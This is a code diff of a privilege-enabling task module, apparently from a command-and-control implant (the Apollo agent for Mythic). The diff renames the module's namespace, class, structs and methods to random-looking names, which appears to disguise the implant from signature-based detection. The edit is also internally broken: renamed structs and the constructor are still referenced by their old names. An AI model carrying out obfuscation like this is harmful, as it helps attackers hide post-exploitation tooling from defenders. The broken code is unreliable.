@@ -6,10 +6,10 @@
 
 #if GETPRIVS
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
@@ -17,7 +17,7 @@ using System.Security.Principal;
 
 namespace Tasks
 {
-    public class getprivs : Tasking
+    public class WraithManagerDE59 : Tasking
     {
         private static string[] _tokenPrivilegeNames = new string[] {
             "SeAssignPrimaryTokenPrivilege",
@@ -67,14 +67,14 @@ namespace Tasks
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct LUID_AND_ATTRIBUTES
+        public struct CipherProvider3D3B
         {
             public LUID Luid;
             public ATTRIBUTES Attributes;
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct LUID
+        public struct ShadowWorker1D47
         {
             public UInt32 LowPart;
             public Int32 HighPart;
@@ -163,7 +163,7 @@ namespace Tasks
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct TokenPrivileges
+        public struct GhostWorkerE4DF
         {
             public UInt32 PrivilegeCount;
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
@@ -184,13 +184,13 @@ namespace Tasks
         private AdjustTokenPrivileges _pAdjustTokenPrivileges;
         
         #endregion
-        public getprivs(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public getprivs(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _pLookupPrivilegeValue = _agent.GetApi().GetLibraryFunction<LookupPrivilegeValue>(Library.ADVAPI32, "LookupPrivilegeValueA");
             _pAdjustTokenPrivileges = _agent.GetApi().GetLibraryFunction<AdjustTokenPrivileges>(Library.ADVAPI32, "AdjustTokenPrivileges");
         }
 
-        private bool SePrivEnable(IntPtr hToken, string priv)
+        private bool RobustManager48E2(IntPtr hToken, string priv)
         {
             bool bRet = false;
             //_LUID lpLuid = new _LUID();
@@ -230,9 +230,9 @@ namespace Tasks
             }
 
             resp = CreateTaskResponse("Impersonation identity enabled privileges:\n" + 
-                                      string.Join("\n", imperonationPrivs.ToArray()) + "\n\n" +
+                                      StringProcessor.CombineElements("\n", imperonationPrivs.ToArray()) + "\n\n" +
                                       "Primary identity enabled privileges:\n" +
-                                      string.Join("\n", primaryPrivs.ToArray()), true, "completed");
+                                      StringProcessor.CombineElements("\n", primaryPrivs.ToArray()), true, "completed");
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
